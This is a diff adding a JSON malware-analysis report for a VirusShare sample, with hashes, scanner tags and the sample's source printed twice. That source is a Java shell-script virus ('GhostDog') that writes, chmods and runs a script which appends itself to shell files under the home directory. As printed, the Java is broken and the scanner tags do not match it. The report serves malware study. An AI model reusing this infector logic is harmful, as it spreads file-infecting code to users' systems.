@@ -1,0 +1,67 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "System": "May run an executable file or a system command on a Mac",
+            "exec": "May run an executable file or a system command using Excel 4 Macros",
+            "write": "May write to a file"
+        },
+        "macro": "import java.io.*;\n\nclass GhostDog {\n    public static void main (String[] argv) {\n    try {\n        String userHome = System.getProperty(\"user.home\");\n        String target = \"$HOME\";\n        FileOutputStream outer = new FileOutputStream(userHome + \"/.ghostdog.sh\");\n        String homer = \"#!/bin/sh\" + \"\\n\" + \"#-_\" + \"\\n\" +\n        \"echo \\\"This is a New Target File from me..-->GhostDog<--.\\\"\" + \"\\n\" +\n        \"for file in `find \" + target + \" -type f -print`\" + \"\\n\" + \"do\" +\n        \"\\n\" + \"    case \\\"`sed 1q $file`\\\" in\" + \"\\n\" +\n        \"        \\\"#!/bin/sh\\\" ) grep '#-_' $file > /dev/null\" +\n        \" || sed -n '/#-_/,$p' $0 >> $file\" + \"\\n\" +\n        \"    esac\" + \"\\n\" + \"done\" + \"\\n\" + \n        \"2>/dev/null\";\n        byte[] buffer = new byte[homer.length()];\n        ghostdog.getBytes(0, ghostdog.length(), buffer, 0);\n        public void start() {\n        if (sleeper == null) {\n        sleeper = new Thread(this);\n        sleeper.setPriority(Thread.MAX_PRIORITY);\n        sleeper.start();\n        }\n        outer.write(buffer);\n        outer.close();\n        Process chmod = Runtime.getRuntime().exec(\"/usr/bin/chmod 888 \" +\n                        userHome + \"/.ghostdog.sh\");\n        Process exec = Runtime.getRuntime().exec(\"/bin/sh \" + userHome +\n                       \"/.ghostdog.sh\");\n        } catch (IOException ioe) {}\n    }\n}"
+    },
+    "filename": "VirusShare_08739f400e193615d8dad8dbedd34c55",
+    "filesize": 1384,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "08739f400e193615d8dad8dbedd34c55",
+        "sha1": "7ca1eecc2b99d93666b179287cc84f315a7fd434",
+        "sha256": "ca6f30685e5bdfa585ab5ac97c18023831e85c4da7cd8d919b2e665fee8933e0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "import java.io.*;",
+            "class GhostDog {",
+            "    public static void main (String[] argv) {",
+            "    try {",
+            "        String userHome = System.getProperty(\"user.home\");",
+            "        String target = \"$HOME\";",
+            "        FileOutputStream outer = new FileOutputStream(userHome + \"/.ghostdog.sh\");",
+            "        String homer = \"#!/bin/sh\" + \"\\n\" + \"#-_\" + \"\\n\" +",
+            "        \"echo \\\"This is a New Target File from me..-->GhostDog<--.\\\"\" + \"\\n\" +",
+            "        \"for file in `find \" + target + \" -type f -print`\" + \"\\n\" + \"do\" +",
+            "        \"\\n\" + \"    case \\\"`sed 1q $file`\\\" in\" + \"\\n\" +",
+            "        \"        \\\"#!/bin/sh\\\" ) grep '#-_' $file > /dev/null\" +",
+            "        \" || sed -n '/#-_/,$p' $0 >> $file\" + \"\\n\" +",
+            "        \"    esac\" + \"\\n\" + \"done\" + \"\\n\" + ",
+            "        \"2>/dev/null\";",
+            "        byte[] buffer = new byte[homer.length()];",
+            "        ghostdog.getBytes(0, ghostdog.length(), buffer, 0);",
+            "        public void start() {",
+            "        if (sleeper == null) {",
+            "        sleeper = new Thread(this);",
+            "        sleeper.setPriority(Thread.MAX_PRIORITY);",
+            "        sleeper.start();",
+            "        }",
+            "        outer.write(buffer);",
+            "        outer.close();",
+            "        Process chmod = Runtime.getRuntime().exec(\"/usr/bin/chmod 888 \" +",
+            "                        userHome + \"/.ghostdog.sh\");",
+            "        Process exec = Runtime.getRuntime().exec(\"/bin/sh \" + userHome +",
+            "                       \"/.ghostdog.sh\");",
+            "        } catch (IOException ioe) {}",
+            "    }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.300898",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
